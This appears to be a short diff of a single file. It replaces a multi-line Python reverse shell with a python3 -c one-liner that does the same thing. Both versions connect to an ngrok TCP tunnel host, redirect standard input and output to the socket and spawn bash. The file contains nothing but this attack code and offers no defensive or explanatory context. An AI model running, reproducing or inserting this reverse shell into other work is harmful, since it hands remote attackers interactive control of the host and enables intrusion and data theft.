@@ -1,12 +1,1 @@
-import socket
-import os
-import pty
-
-RHOST = "0.tcp.ap.ngrok.io"
-RPORT = 13619
-
-s = socket.socket()
-s.connect((RHOST, RPORT))
-for fd in (0, 1, 2):
-    os.dup2(s.fileno(), fd)
-pty.spawn("bash")
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.tcp.ap.ngrok.io",10014));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
